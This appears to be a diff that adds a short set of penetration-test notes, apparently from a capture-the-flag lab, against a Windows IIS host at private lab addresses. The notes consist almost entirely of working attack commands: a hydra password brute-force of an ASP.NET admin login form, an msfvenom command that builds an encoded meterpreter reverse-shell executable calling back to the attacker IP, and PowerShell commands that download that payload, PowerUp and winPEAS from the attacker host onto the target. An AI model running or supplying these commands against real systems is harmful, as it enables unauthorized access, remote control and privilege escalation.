@@ -1,0 +1,12 @@
+Target : 10.10.30.55
+Attacker : 10.18.115.106
+
+hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.30.55 http-post-form '/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=R5ExU3BuR9YpF3sGSAsRegWOc90PWSYWyhGJ1jo%2BWZbN5XK6OZMLaQyQsjEc5YDmhZVQi%2F0NASS%2F25nKyXciBz%2Fdyr1aZhFoSpKqA9vV%2FyZGwmSJ4BELkrs%2BuBKVmAyDvJVXIBAYpdjBHPQ%2FHimoRmRtmQUOZwp87SXW8VPcYyKRLS4d&__EVENTVALIDATION=EenzdCC3leCixte3bKhBSZcQd%2B9tdV9Z1VDn56KSCJdz8KzHX5etq8GAaGrQXpdwh9d6qXDTDGe64%2FfvzAgSxxXgz531GwSfGQS%2FlAAVAN5KRktLQyTaAQYwN15R4mPQ2dmeo9wP50OmHqtn2tXE9X5C6paE55ZKs40Mx3DRzOm7oq4N&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -I
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.115.106 LPORT=44445 -e x86/shikata_ga_nai -f exe -o clown.exe
+
+powershell -c "Invoke-Webrequest -URI http://10.18.115.106/clown.exe -OutFile 'c:\inetpub\wwwroot\App_Data\files\clown.exe'"
+powershell -c "Invoke-Webrequest -URI http://10.18.115.106/PowerUp.ps1 -OutFile 'c:\inetpub\wwwroot\App_Data\files\PowerUp.ps1'"
+
+powershell -c "Invoke-Webrequest -URI http://10.18.115.106/winPEAS.bat -OutFile 'C:\Users\Administrator\Desktop\winPEAS.bat'"
+
